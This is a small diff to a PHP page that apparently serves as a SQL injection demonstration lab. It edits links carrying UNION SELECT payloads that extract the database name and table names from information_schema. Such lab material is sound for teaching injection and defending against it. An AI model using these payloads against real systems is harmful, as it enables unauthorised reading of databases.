@@ -6,8 +6,8 @@ include("db.php");
 
 <a href="?page=sql-injection">Todos os registros</a><br />
 <a href="?page=sql-injection&id=3">Filtrar por ID</a><br />
-<a href='?page=sql-injection&id=3 union select 1, concat("%inicio%", database(), "%fim%" ), 3'>Database</a><br />
-<a href='?page=sql-injection&id=3 union select 1, concat("<b>", table_name, "</b>") ,3 from information_schema.tables where table_schema=database()'>Tabelas</a><br />
+<a href='?page=sql-injection&id=3 union select 1, concat("%inicio%", database(), "%fim%" ), 2, 3'>Recupear o nome do banco de dados</a><br />
+<a href='?page=sql-injection&id=3 union select 1, concat("<b>", table_name, "</b>") ,2, 3 from information_schema.tables where table_schema=database()'>Tabelas</a><br />
 
 
 <?php
